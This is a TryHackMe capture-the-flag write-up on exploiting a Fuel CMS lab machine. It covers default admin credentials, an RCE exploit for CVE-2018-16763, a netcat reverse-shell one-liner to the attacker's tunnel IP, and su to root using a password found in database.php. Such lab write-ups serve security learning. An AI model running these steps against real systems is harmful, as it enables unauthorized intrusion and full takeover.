---
layout: post
permalink: /posts/thm/ignite-ctf
title: "THM write-up: Ignite CTF"
date: 2020-08-07 19:57
tags: tryhackme CTF recon privilege_escalate reverse_shell fuel_cms
description: "This time I going to do a write-up on ignite ctf from tryhackme. This room is written by DarkStar7471 and lollava."
---

![titlecard](/assets/images/THM/2020-08-07-ignite-ctf/1.png)

[Link: https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)

Time for my intro: another day, another CTF challenge. This time I going to do a write-up on ignite CTF room from tryhackme. This room is written by DarkStar7471 and lollava. A great shout out for them. Like the ordinary tryhackme CTF room, enumerate, exploit and capture the flag. Lets' get it on.

## Task 1: Capture the flags

Like the tile said, capture both user and the root flags. Startup your nmap to do the port scanning. USe the following nmap command.

```
nmap -A -v <MACHINE IP>
```

![nmap](/assets/images/THM/2020-08-07-ignite-ctf/2.png)

It seems that we only have a single open port which is port 80 or HTTP. Scanning with -p- (full port) doesn't give us any additional port. Port 80 is the only port for this challenge. Let's check out what is inside this port.

![ignite cms](/assets/images/THM/2020-08-07-ignite-ctf/3.png)

We are greeted by Fuel CMS on port 80. 

![Admin IP](/assets/images/THM/2020-08-07-ignite-ctf/4.png)

A default password and admin login page for the CMS is revealed on the site. 

![Dashboard](/assets/images/THM/2020-08-07-ignite-ctf/5.png)

Oh yes, the credential works on the login page which gives us access as the admin of the site.  The bad news is we are not able to do anything on this dashboard. Almost all the stuff is empty. What else we can do? Finding the Fuel CMS v1.4 exploit on google?

![CVE](/assets/images/THM/2020-08-07-ignite-ctf/6.png)

Oops, guess we found something on the [internet](https://www.cvedetails.com/cve/CVE-2018-16763/). A further look on the CVE number on [exploit-db](https://www.exploit-db.com/exploits/47138) prompt us a python script.

![script](/assets/images/THM/2020-08-07-ignite-ctf/7.png)

I guess it worth a try. But before running the script, make sure you change some of the parameters as shown in the figure below. 

![parameter](/assets/images/THM/2020-08-07-ignite-ctf/8.png)

Please change the URL parameter according to the machine IP and remove the proxy value (red box) before running the script. We don't need the proxy as we are not using the burp suite, a simple shell is more than enough for this challenge. 

Run the python and you be prompt to input a command line.

![cmd](/assets/images/THM/2020-08-07-ignite-ctf/9.png)

Oh yes, we are now using the python script as a remote shell for the server. Let's move to Task 1-1.

### Task 1-1: User's flag

There are two ways to solve this task.

- Using the python script as a remote shell
- Reverse the shell using Netcat (Jeff Price approach)

For this task, I'm going to use the python script and Netcat for the next task. I will explain the con of using the python script as remote shell later on. 

First thing first, we have to check the content inside /home directory and list out all the files.

![home](/assets/images/THM/2020-08-07-ignite-ctf/10.png)

![flag](/assets/images/THM/2020-08-07-ignite-ctf/11.png)

We have a www-data user inside the home directory. Also, the flag of the user can be found inside the directory.

### Task 1-2: root's flag

It is time to root the machine. The only way to root the machine is via the shell. This is because we have only one open port on the machine. How are we going to escalate the privilege as root? Actually, it took me some time to figure out. The answer is on the Fuel CMS page.

![Fuel DB](/assets/images/THM/2020-08-07-ignite-ctf/13.png)

This particular paragraph tells something is stored inside the database.php. Let's check it out.

![DB](/assets/images/THM/2020-08-07-ignite-ctf/14.png)

Well, we just found the password for the root. How are we gonna use this credential? Let me tell you the cons of the python script remote shell. The shell will not able to display the error and we are unable to identify the problem. Also, the shell will not prompt for password input if you use su command. A smart move like pipeline such as **'echo mememe | su -c whoami'** will not solve the issues. I guess reverse shell using the Netcat is the only choice.

![reverse shell](/assets/images/THM/2020-08-07-ignite-ctf/15.png)

The figure above shows the reverse shell command using Netcat. Before running the command, make sure you have your listener on another terminal. Use the following command.

```
nc -lvnp 4444
```

After that, copy this command in the python script remote shell.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Tunnel IP> 4444 >/tmp/f
```

Make sure you use your [tunnel IP](https://tryhackme.com/access). After that, your Netcat will prompt a reverse shell of the server.

![reverse success](/assets/images/THM/2020-08-07-ignite-ctf/16.png)

Alright, we got the reverse shell. Time to make ourselves a superuser using su command.

![su problem](/assets/images/THM/2020-08-07-ignite-ctf/17.png)

Wait a sec, you can't run su command on the shell !! This is because /bin/sh of the server is turned off or disabled. We need to spawn a shell using the python. 

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

You are now allowed to enter the su command the password to root the machine.

![su](/assets/images/THM/2020-08-07-ignite-ctf/18.png)

Congratulation, you are now rooted in the machine. Let's find the final flag.

![flag](/assets/images/THM/2020-08-07-ignite-ctf/19.png)

Gotcha, the final flag is now captured.

## Conclusion

We have now ignited the fuel CMS machine (this is what the room called) and that's all for the wonderful CTF challenge. Hope you enjoy it and see you again :)